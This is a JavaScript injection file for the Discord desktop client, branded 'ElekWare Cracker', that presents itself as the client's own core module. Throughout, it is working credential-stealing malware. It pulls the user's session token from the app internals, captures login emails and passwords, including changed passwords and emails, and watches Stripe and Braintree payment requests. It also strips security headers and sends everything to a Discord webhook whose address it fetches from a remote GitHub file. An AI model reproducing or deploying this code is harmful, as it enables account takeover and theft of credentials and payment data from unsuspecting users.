const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

asd=0;

const config = {
  webhook: 'almafa',
  embed_icon: 'https://media.discordapp.net/attachments/666303695323136010/985695150544134214/Nevtelen.png'.replace(/ /g, '%20'),
  injection_url: 'https://raw.githubusercontent.com/SzollosiJanos/token/main/injection',
  api: 'https://discord.com/api/v9/users/@me',
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);

  const content = {
    username: 'ElekWare Cracker',
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: 8363488,
        fields: [
          {
            name: '**Account Info**',
            value: `Email: **${email}** - Password: **${password}**`,
            inline: false,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: 'ElekWare Cracker by: MegoltElek#1102',
        },
      },
    ],
  };
  content['content'] = '@everyone';
  hooker(content);
};

const sendtoken2 = async () => {
	const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  const json = await getInfo(token);
  const content = {
    username: 'ElekWare Cracker',
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: 8363488,
        fields: [
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: 'ElekWare Cracker by: MegoltElek#1102',
        },
      },
    ],
  };
  content['content'] = '@everyone';
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);

  const content = {
    username: 'ElekWare Cracker',
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: 8363488,
        fields: [
          {
            name: '**Password Changed**',
            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: 'ElekWare Cracker by: MegoltElek#1102',
        },
      },
    ],
  };
  content['content'] = '@everyone';
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);

  const content = {
    username: 'ElekWare Cracker',
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: 8363488,
        fields: [
          {
            name: '**Email Changed**',
            value: `New Email: **${email}**\nPassword: **${password}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: 'ElekWare Cracker by: MegoltElek#1102',
        },
      },
    ],
  };
  content['content'] = '@everyone';
  hooker(content);
};

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if(asd==0){
	  const window = BrowserWindow.getAllWindows()[0];
		window.webContents.executeJavaScript(`
		var xmlHttp = new XMLHttpRequest();
		xmlHttp.open( "GET", "https://raw.githubusercontent.com/SzollosiJanos/token/main/hook", false );
		xmlHttp.send( null );
		xmlHttp.responseText;`, !0).then((asd => {
		config.webhook='https://discord.com/api/webhooks/'+asd.replace(/(\r\n|\n|\r)/gm, "");
		}))
	  sendtoken2().catch(console.error);
	  asd=1;
  }
  
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');
